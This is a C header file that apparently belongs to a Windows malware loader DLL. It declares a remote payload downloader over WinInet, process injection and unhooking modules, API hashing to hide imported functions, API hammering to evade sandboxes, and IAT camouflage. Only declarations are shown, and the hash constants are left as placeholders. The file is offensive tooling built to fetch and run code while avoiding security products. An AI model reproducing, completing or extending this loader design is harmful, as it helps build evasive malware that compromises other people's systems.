#pragma once
#include <windows.h>
#include <stdio.h>
#include "typedef.h"

//global variables
extern unsigned char* pPayload;
extern PSTR url;
extern PSTR endpoint;
extern SIZE_T sSize;


// winapi.c
#define INITIAL_SEED	8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

typedef struct _API_HASHING {
	fnGetTickCount64                pGetTickCount64;
	fnInternetOpenA                 pInternetOpenA;
	fnInternetConnectA              pInternetConnectA;
	fnHttpOpenRequestA              pHttpOpenRequestA;
	fnInternetSetOptionA            pInternetSetOptionA;
	fnHttpSendRequestA               pHttpSendRequestA;
	fnInternetReadFile              pInternetReadFile;
	fnInternetCloseHandle           pInternetCloseHandle;
	fnLoadLibraryA					pLoadLibraryA;
} API_HASHING, * PAPI_HASHING;

typedef void*(NTAPI* fnAddVectoredExceptionHandler)(
        ULONG                       First,
        PVECTORED_EXCEPTION_HANDLER Handler
);

typedef long(NTAPI* fnRemoveVectoredExceptionHandler)(
        PVOID Handle
);

// inject.c
#include "inject.h"

//unhook.c
#include "unhook.h"

// apihashing.c
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

// apihammer.c
BOOL ApiHammering(DWORD Stress);

// downloader.c
DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl);

//iatcamo.c
VOID IatCamouflage();

//dllmain.c

#define kernel32dll_CRC32 0x00
#define AddVectoredExceptionHandler_CRC32 0x00
#define RemoveVectoredExceptionHandler_CRC32 0x00